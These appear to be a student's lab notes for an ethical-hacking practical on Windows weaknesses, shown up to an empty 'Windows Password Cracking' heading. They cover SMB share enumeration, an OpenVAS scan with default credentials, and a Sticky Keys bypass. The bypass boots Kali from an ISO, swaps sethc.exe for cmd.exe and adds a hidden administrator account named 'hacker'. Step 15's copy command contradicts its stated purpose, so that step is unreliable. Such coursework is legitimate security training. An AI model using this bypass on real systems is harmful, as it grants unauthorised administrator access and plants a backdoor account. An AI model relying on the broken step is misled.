# EHD Practical 9 - OS Vulnerabilities

###### tags: #EHD 

## Table of Contents
```toc
```

## Windows Vulnerabilities
### View Shared Resources on Windows Systems
**On Win10 VM**
1. Repeat `net view \\Win-10 IP` to show a list of available shared folders
2. Repeat the `net view` command on another Win10 VM
3. Run `net use Z: \\Win10-IP\shared` to map shared folder to Z drive
4. Run `dir Z: \\Win10-IP\shared`
5. Type `nbtstat /?` for help
6. Type `nbtstat -a Win10-IP`

### OpenVAS
1. Power on OpenVAS image
2. At the login screen, note the IP address of the OpenVAS image
3. On web browser on another VM, browser to the OpenVAS IP and add exception for the security certificate
4. Login to the Greenbone Security Manager with username `admin` and password `admin`
5. Power on and use web-server2 as the target and take note of its IP address
6. In the Web Browser, in the Greenbone Security Manager, under the Configuration menu, select **Targets**
7. Click on the star icon on the top left corner to create a **New Target**
8. Check that the Manual radio button is selected and enter IP address of web-server2
9. Click **Create**
10. Under the Scans menu, select Tasks
11. Click on the star icon in the top left corner to create a **New Task**
12. Enter a name for a task
13. For Scan Config, choose the default **Full and fast**
14. Click **Create**
15. Under Actions, click on the Play icon to start the scan
16. When the scan is completed, the status will be updated to **Done**
17. Under **Reports**, click to view the report to view the vulnerabilities found
18. When clicking on the vulnerability, details will be displayed
19. Under the **Configuration** menu, select Scan Configs
20. Click on Full and fast to see what type of NVTs (Network Vulnerability Tests) are included in the scan
21. To shut down OpenVAS, select the **Maintenance** and choose **Power**

### SMB/CIFS
> Server Message Block (SMB) or CIFS (Common Internet File System) can be used to share resources between computers running Windows or Linux

**On Kali VM**
1. To list out shared folders on a remote system, use the `smbclient` command (Use `-U` option to specify Windows 10 user account)
```
smbclient -L Win10-IP -U admin 
```
2. Start Wireshark to capture the network traffic
3. Use the following command to connect shared folder on Win10:
```
smbclient //Win10-IP/shared
```
4. Press <kbd>Enter</kbd> if asked for password
5. If there is a `NT_STATUS_ACCESS_DENIED` message, specify Win10 username
```
smbclient //Win10-IP/shared -U admin
``` 
6. At the SMB prompt, type `ls` to list contents of the share
7. Use the `get` command to download the text file to Kali
```
get test.txt
```
8. Type exit to end the connection
9. Stop Wireshark. View the TCP packets with the SMB protocol connecting to port 445 on Win10

### Accessing Windows without Logging In (Sticky Keys)
1. Shutdown Win10 VM
2. Use ISO image file 

![](https://i.imgur.com/dCGpCq9.png)

3. Start the Win10 VM. When VMWare word appears, press <kbd>F2</kbd> to enter BIOS setup utility
4. In the Boot menu, select CD-ROM Drive and bring it to the top
5. Press <kbd>F10</kbd> to save and exit
6. Win10 VM will boot into Kali using the ISO file
7. Login with username `root` and password `toor` (or username `kali` and password `kali`)
8. Type `fdisk -l` to view the Windows partition
9. Windows partition may be listed as `/dev/sda2`
10. Type `mkdir /mnt/sda2` to create a mount point
11. Type `mount /dev/sda2/ /mnt/sda2` to mount the Windows partition
12. Type `ls /mnt/sda2` to list contents of the Windows partition
13. Type `cd /mnt/sda2/Windows/System32`
14. Type `cp sethc.exe sethc.exe.bak` to make a copy of the `sethc.exe` file
15. Type `cp cmd.exe sethc.exe.bak` to overwrite the original file with the Command Prompt executable
16. Type `init 0` to shutdown
17. Set the CD/DVD back to "Use Physical Drive"
18. Start up the Win10 VM
19. At the login screen, press the shift key 5 times quickly
20. In the Command Prompt, type:
```
net user hacker 1qwer$#@! /add
net localgroup administrators hacker /add
exit
```

21. Restart the Win10 VM to refresh and login to the newly added user

### Windows Password Cracking